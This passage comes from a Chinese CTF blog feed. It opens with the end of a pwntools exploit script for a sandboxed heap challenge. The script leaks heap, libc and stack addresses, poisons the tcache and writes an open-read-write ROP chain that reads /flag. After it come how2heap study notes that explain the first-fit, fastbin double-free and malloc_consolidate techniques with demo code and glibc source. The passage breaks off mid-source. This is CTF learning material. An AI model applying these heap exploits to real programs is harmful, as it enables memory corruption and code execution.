class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">666</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x157d8a</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line">pop6 = libc_base + <span class="number">0x00026b69</span></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;environ= &quot;</span>+<span class="built_in">hex</span>(environ)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(environ-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description:&#x27;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_addr= &quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(stack_addr-<span class="number">0x100</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x6f0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x500</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop_rdi)+p64(heap_base+<span class="number">0x500</span>)+p64(puts)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">4</span>,<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">2</span>,orw)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#chunk_ptr = 0x5555555580a0</span></span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;因为ctf太卷了，现在比赛基本都会遇到沙盒，没办法，只能学一学，总结一下&lt;/p&gt;
&lt;h2 id=&quot;沙箱&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【how2heap】学习笔记</title>
    <link href="https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-10T03:08:56.640Z</published>
    <updated>2021-05-20T04:44:29.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shellphish/how2heap.git</span><br><span class="line">cd how2heap</span><br><span class="line">make</span><br></pre></td></tr></table></figure><blockquote><p>largebin、unsorted bin为先进先出，tcache、fastbin，small bin为先进后出</p></blockquote><h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first-fit"></a>0x01 first-fit</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这个文件不是攻击demo，这个对glibc的一个机制(first-fit)的一个说明，并且这个机制常用在UAF中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分配两个缓冲区，不一定是fastbin，可以比较大的</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="comment">// 我们不需要在释放其他缓冲区，只要我们的分配小于0x512，就可以从刚刚free的内存中取</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="程序结果及调试"><a href="#程序结果及调试" class="headerlink" title="程序结果及调试"></a>程序结果及调试</h2><p>我们在源码的32行下一个断点，康康此时的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508176426/0" alt="image-20210510113041298"></p><p>可以看到此时的a，c位于同一内存空间</p><p>现在我们执行完<code>strcpy(c,&quot;this is C!&quot;)</code>,再康康结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508185273/0" alt="image-20210510113219170"></p><p>此时更改c成功更改了a的内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先分配了两个chunk块：a(0x512)，b(0x256)</p><p>然后给A赋值后，释放A，之后分配c(0x500)</p><p>然后给C赋值为”this is C”,此时输出a,c的地址和内容</p><p>发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块</p><p>而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(<strong>free后并未置0</strong>) :)</p><h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 一个基于fastbin的double-free利用</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果再free一次，程序就会crash，因为a是free链上最顶的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因此我们free b</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">    <span class="comment">// 现在我们再free一次a</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="comment">// 现在我们的free链变成了 a-&gt;b-&gt;a</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试"><a href="#运行结果及调试" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们看下没free前的堆</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508228458/0" alt="image-20210510114157569"></p><p>一共三个堆块，a，b，c，然后我们free a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508231494/0" alt="image-20210510114245279"></p><p>然后free b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508233420/0" alt="image-20210510114313375"></p><p>然后再free a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508244838/0" alt="image-20210510114604143"></p><p>可以看到此时已经构成了一个chunk环即a-&gt;b-&gt;a，此时我们就可以分配两次0x602000。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先申请了三个chunk a，b，c</p><p>然后释放a，再释放b，再释放a</p><p>此时的free list为a-&gt;b-&gt;a</p><p>然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了，这其实也算是fastbin的一个特性了。</p><p>PS：这里为什么fastbin会成功呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</span></span><br><span class="line"><span class="comment">//fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只要不是连续释放同一个堆块即可。</p><h1 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 分配一个large bin来触发malloc_consolidate</span></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin  </span></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-1"><a href="#运行结果及调试-1" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们首先看一下malloc两次后的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508541457/0" alt="image-20210510131237934"></p><p>此时我们free p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508542876/0" alt="image-20210510131306643"></p><p>此时我们malloc一个0x400的的大chunk，这样就会触发<code>malloc_consolidate</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508545731/0" alt="image-20210510131408943"></p><p>可以看到此时我们的p1就被放入到<code>small bin</code>中了</p><h3 id="问题：这个过程到底发生了什么呢"><a href="#问题：这个过程到底发生了什么呢" class="headerlink" title="问题：这个过程到底发生了什么呢"></a>问题：这个过程到底发生了什么呢</h3><p>我们现来康康<code>malloc_consolidate</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">     check_inuse_chunk(av, p);</span><br><span class="line">     nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">     size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">     nextchunk = chunk_at_offset(p, size);</span><br><span class="line">     nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = p-&gt;prev_size;</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">       nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">         size += nextsize;</span><br><span class="line">         unlink(av, nextchunk, bck, fwd);</span><br><span class="line">       &#125; <span class="keyword">else</span></span><br><span class="line">         clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">       unsorted_bin-&gt;fd = p;</span><br><span class="line">       first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">       <span 